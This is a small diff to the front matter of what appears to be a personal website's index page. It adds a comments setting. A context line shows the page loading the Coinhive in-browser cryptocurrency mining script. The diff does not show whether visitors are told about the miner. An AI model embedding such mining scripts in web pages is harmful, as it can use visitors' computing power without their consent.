@@ -2,6 +2,7 @@
 layout: default
 title: AustinHuang.me
 permalink: /
+comments: true
 ---
 
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
